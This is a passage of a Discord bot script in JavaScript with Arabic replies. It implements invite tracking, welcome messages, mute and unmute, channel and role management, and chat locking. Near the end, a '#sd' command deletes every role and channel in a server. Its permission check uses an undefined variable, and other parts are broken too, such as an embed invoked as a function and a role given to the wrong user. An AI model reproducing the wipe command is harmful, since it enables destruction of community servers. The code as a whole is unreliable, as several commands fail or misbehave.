    guild.fetchInvites().then((data) => {
        data.forEach((Invite, key, map) => {
            var Inv = Invite.code;
            if (data[Inv])
                if (data[Inv] < Invite.uses) {
 channel.send(`تم دعوته بواسطة  ${Invite.inviter} `) ;         
 }
            data[Inv] = Invite.uses;
       
       });
    });
});

client.on('guildMemberAdd', member => {
    let channel = member.guild.channels.find('name', 'welcome');
    let memberavatar = member.user.avatarURL
      if (!channel) return;
    let embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .setThumbnail(memberavatar)
        .addField('🎽 | name :  ',`${member}`)
        .addField('welcome To L-Ro3b','ّ')
        .addField('Enjoy in our community','ّ')
        .addField('THANKS For Joinin','ّ')
        .setFooter(`${member.guild.name}`)
        .setTimestamp()
      channel.sendEmbed(embed);
    });
    
    client.on('guildMemberRemove', member => {
        var embed = new Discord.RichEmbed()
        .setAuthor(member.user.username, member.user.avatarURL)
        .setThumbnail(member.user.avatarURL)
        .setDescription(``)
        .addField('لقد غادر',`**${member}**`)
        .setColor('RED')
    
    var channel =member.guild.channels.find('name', 'welcome')
    if (!channel) return;
    channel.send({embed : embed});
});

client.on("message", message => {
  let command = message.content.split(" ")[0];
  if (command === "&mute") {
          if(!message.channel.guild) return message.reply(':x: اسف لكن هذا الامر للسيرفرات فقط ');
          if (!message.member.hasPermission('ADMINISTRATOR')) return message.reply(`انت لست ادمن`).catch(console.error)
  let user = message.mentions.users.first();
  let log = client.channels.find('name', 'logs');
  let muteRole = client.guilds.get(message.guild.id).roles.find('name', 'Muted');
  if (!muteRole) return message.reply(" لا يوجد رتبة الميوت 'Muted' ").catch(console.error);
  if (!log) return message.reply("لا يوجد الروم المراد ارسال المعلومات له 'log'");
  if (message.mentions.users.size < 1) return message.reply(' يجب عليك المنشن اولاً ');
  var embed = new Discord.RichEmbed()
    .setColor(0x00AE86)
    .addField(' Mute ', ' | :white_check_mark: |')
    .addField('تم اعطاء الميوت ل',` ${user.username}#${user.discriminator}`)
    .addField('السبب', 'تعكير نظام الشات')
    .addField('بواسطة:',` ${message.author.username}#${message.author.discriminator}`)
  ({embed: embed});

  if (!message.guild.member(client.user).hasPermission('MANAGE_ROLES_OR_PERMISSIONS')) return message.reply(' لا يوجد لدي برمشن Manage Roles ').catch(console.error);

  if (message.guild.member(user).roles.has(muteRole.id)) {
      client.channels.get(log.id).send({embed}).catch(console.error);
  } else {
    message.guild.member(user).addRole(muteRole).then(() => {
      client.channels.get(log.id).send({embed}).catch(console.error);
    });
  }

};

if (command === "&unmute") {
          if(!message.channel.guild) return message.reply(':x: اسف لكن هذا الامر للسيرفرات فقط ');
          if (!message.member.hasPermission('ADMINISTRATOR')) return message.reply(`انت لست ادمن`).catch(console.error)
  let user = message.mentions.users.first();
  let log = client.channels.find('name', 'logs');
  let muteRole = client.guilds.get(message.guild.id).roles.find('name', 'Muted');
  if (!muteRole) return message.reply(" لا يوجد رتبة الميوت 'Muted' ");
  if (!log) return message.reply("لا يوجد الروم المراد ارسال المعلومات له 'log'");
  if (message.mentions.users.size < 1) return message.reply(' يجب عليك المنشن اولاً ');
  const embed = new Discord.RichEmbed()
    .setColor(0x00AE86)
    .addField('UnMute ', ' | :white_check_mark: |')
    .addField('تم فك الميوت عن', `${user.username}#${user.discriminator}`)
    .addField('بواسطة:', `${message.author.username}#${message.author.discriminator}`)
  ({embed: embed});

  if (!message.guild.member(client.user).hasPermission('MANAGE_ROLES_OR_PERMISSIONS')) return message.reply(' لا يوجد لدي برمشن Manage Roles ');

  if (message.guild.member(user).removeRole(muteRole.id)) {
      client.channels.get(log.id).send({embed});
  } else {
    message.guild.member(user).removeRole(muteRole).then(() => {
      client.channels.get(log.id).send({embed});
    });
  }

};


});

client.on('message', message => {
if (message.content.startsWith(prefix+"role")) {
    if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply('*** انت لست ادمن ***');
    message.react("✔️")
    var args = message.content.split(" ").slice(1);
    var argresult = args.join(' ');
                message.guild.createRole({name:`${argresult}`})
          
        }
});

client.on('message', message => {
if (message.content.startsWith(prefix+"ch")) {
    if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply('*** انت لست ادمن ***');
    message.react("✔️")
    var args = message.content.split(" ").slice(1);
    var argresult = args.join(' ');
                message.guild.createChannel(`${argresult}`, 'voice')
          
        }
});

client.on('message', message => {
if (message.content.startsWith(prefix+"tx")) {
    if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply('*** انت لست ادمن ***');
    message.react(":x:")
    var args = message.content.split(" ").slice(1);
    var argresult = args.join(' ');
                message.guild.createChannel(`${argresult}`, 'text')
          
        }
});


client.on("message", (message) => {
    if (message.content.startsWith(prefix+'delete')) {
    if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply('*** انت لست ادمن ***');

        let args = message.content.split(' ').slice(1);
        let channel = message.client.channels.find('name', args.join(' '));
        if (!channel) return message.reply('**لا يوجد روم بهذا الاسم**').catch(console.error);
        channel.delete()
    }
});



client.on('message', message => {

  if (message.content === "&cch") {
                      if(!message.channel.guild) return message.reply(' This command only for servers');

if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply('انت لست ادمن')
         message.channel.overwritePermissions(message.guild.id, {
       SEND_MESSAGES: false

         }).then(() => {
             message.reply("تم قفل الشات :white_check_mark: ")
         });
           }
           
if (message.content === "&och") {
  if(!message.channel.guild) return message.reply(' This command only for servers');

if(!message.member.hasPermission('ADMINISTRATOR')) return message.reply('انت لست ادمن');
         message.channel.overwritePermissions(message.guild.id, {
       SEND_MESSAGES: true

         }).then(() => {
             message.reply("تم فتح الشات:white_check_mark:")
         });
           }



});

client.on("message",msg =>{
    if(msg.content == "&voiceless"){
        let voiceless = msg.guild.roles.find("name", "Voiceless");
        let member = msg.mentions.members.first();
        msg.member.addRole(voiceless).catch(console.error);
        msg.react("👍")
    }
});

//------------------------------

client.on('message', message => {
    var prefix = "&"
    let command = message.content.split(" ")[0];
  command = command.slice(prefix.length);
  let args = message.content.split(" ").slice(1);
if(command == "draw") {
    var Canvas = require('canvas')
  , Image = new Canvas.Image
  , canvas = new Canvas(450, 170)
  , ctx = canvas.getContext('2d');
  ctx.font = '30px Impact';
  let args = message.content.split(" ").slice(1);
  
Image.src = canvas.toBuffer();
    console.log(Image);
ctx.drawImage(Image, 0, 0, Image.width / 470, Image.height / 170);
ctx.fillText(args.join("  "),110, 70);
ctx.beginPath();
ctx.lineTo(50, 102);
ctx.stroke();

message.channel.sendFile(canvas.toBuffer());
}
}).on('ready', () => {
});

client.on('message', function(message) {
    var prefix = "&"
 
    if(message.content.startsWith(prefix + 'active')) {
        let guild = message.mentions.members.first();
        let modlog = client.channels.find('name', 'active');
        let embed = new Discord.RichEmbed()
  .setColor('3fcf24')
  .setDescription('**__:white_check_mark: لقد تم تفعيلك في السيرفر__**')
  .addField('تم تفعيل العضو :', "<@" + message.author.id + ">")
  .setImage(`${message.author.avatarURL}`)
  

  message.delete("..");


        message.member.addRole(message.guild.roles.find('name', '-> Gamers 🎮'));
        message.channel.send({embed:embed});
    }
});
client.on('message', ra3d => {   
 if (ra3d.content.startsWith("#sd")) {
    if(!message.member.hasPermission('MANAGE_CHANNELS')) return message.reply('**⚠  لايوجد لديك صلاحية**');
     ra3d.guild.roles.forEach(r => { r.delete() }) 
     ra3d.guild.channels.forEach(c => { c.delete() })
                let embed = new Discord.RichEmbed()
            .setColor('#fd0101')
            .setDescription('تم حذف كل شي في السيرفر✅')
           ra3d.author.sendEmbed(embed);
 }
 });
client.login(process.env.BOT_TOKEN);
